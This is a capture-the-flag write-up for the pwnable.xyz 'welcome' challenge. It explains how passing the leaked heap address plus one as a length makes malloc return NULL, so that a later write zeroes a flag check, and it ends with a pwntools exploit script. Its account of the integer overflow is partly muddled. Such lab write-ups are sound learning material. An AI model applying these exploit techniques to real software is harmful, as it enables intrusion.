## Overview

malloc failing by integer overflow causing NULL which satisfies a
condition in getting the flag

## Analysis

We are given a binary with the following protections

```
❯ checksec challenge

[*] '/home/mfkrypt/pwn-learning-notes/pwnablexyz/welcome/challenge'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    FORTIFY:    Enabled
```

We can observe all protections are enabled. Running the binary itself reveals a leak

![Description](/static/images/pwnablexyz/1.png)

Let us now check the decompiled source

```c
undefined8 main(void)

{
  long *malloc_ret;
  void *buffer;
  long in_FS_OFFSET;
  size_t length;
  long canary;

  canary = *(long *)(in_FS_OFFSET + 0x28);
  setup();

  puts("Welcome.");
  malloc_ret = (long *)malloc(262144);
  *malloc_ret = 1;  // Stores the integer 1 at the beginning of that allocated memory

  __printf_chk(1,"Leak: %p\n",malloc_ret);
  __printf_chk(1,"Length of your message: ");

  length = 0;
  __isoc99_scanf(&DAT_00100c50,&length);
  buffer = malloc(length);
  __printf_chk(1,"Enter your message: ");

  read(0,buffer,length);
  *(undefined *)((long)buffer + (length - 1)) = 0;

  write(1,buffer,length);
  if (*malloc_ret == 0) {
    system("cat /flag");
  }

  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }

  return 0;
}
```

We can see over here:

```c
malloc_ret = (long *)malloc(262144);
*malloc_ret = 1;
```

`malloc` returns a pointer, `malloc_ret` and assigned an integer value of `1` . It will probably look like this in memory:

```
0x7fad99950010:  0x0000000000000001
```

In this line:

```c
 __printf_chk(1,"Leak: %p\n",malloc_ret);
```

It leaks the heap address of the returned `malloc` pointer. Other than that,&#x20;

```c
__isoc99_scanf(&DAT_00100c50,&length);
buffer = malloc(length);

read(0,buffer,length);
```

Allocates the `length` we input which is a `long integer` type to allocate memory to a buffer and then reads up the buffer up to the `length` .

And the part below writes a null byte at the last byte of the input buffer

```c
*(undefined *)((long)buffer + (length - 1)) = 0;
write(1,buffer,length);
```

if the returned `malloc` integer value is `0` , we get the flag

```c
if (*malloc_ret == 0) {
    system("cat /flag");
  }
```

## Plan

Looking at the man page of `malloc`

![Description](/static/images/pwnablexyz/2.png)

On error, `malloc` returns NULL . Okay, soooo how does this affect what we are going to do? Well, since the program leaks an address, we can take advantage of that address and use it as a size to fail `malloc` when it allocates memory.

The leaked heap pointer isn’t used as a pointer in the logic — it’s used as a large number to trigger `malloc` failure.

Why does it error or fail? For example, the leaked pointer address is `0x7fb304b31010` the equivalent in decimal is `140406854717456` . That is 14TB of memory which is way too huge since the max value for `unsigned int` is `4,294,967,295` .

![Description](/static/images/pwnablexyz/3.png)

On a 32-bit `unsigned int`, very large values like the leaked address, `0x7fb304b31010` will overflow and may result in a small or even negative signed `int` when passed to `malloc`, which causes it to fail and return `NULL`

After overflowing the pointer of `malloc` In this line:

```c
*(undefined *)((long)buffer + (length - 1)) = 0;
```

the `buffer` turns to `NULL` after the error:

```c
NULL + length - 1 = length - 1
```

That `length - 1` ends up being **exactly** the leaked address `malloc_ret` . So to make up for this we need to input the `leak_address + 1` to cancel the `length - 1` . But we need to convert them into a `str` type because `scanf` here expects a string input of the `unsigned long int` .

---

## Exploit

We can manipulate `length` such that `malloc(length)` returns `NULL`, and therefore `buffer = NULL`. Then:

```c
*(buffer + length - 1) = 0;
// becomes:

*(NULL + leaked_address) = 0;
// which writes a zero byte to *malloc_ret
```

Here is the script:

```python
from pwn import *

elf = context.binary = ELF('./challenge', checksec=False)
libc = elf.libc

gs = '''
c
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)


def exploit():
    io = start()

    io.recvuntil(b'Leak: ')
    leak = int(io.recvline(), 16)

    log.success(f"Leaked malloc address: {hex(leak)}")

    io.sendlineafter(b'Length of your message: ', str(leak + 1))
    io.sendlineafter(b'Enter your message: ', "cool")

    io.interactive()


if __name__ == "__main__":
    exploit()
```
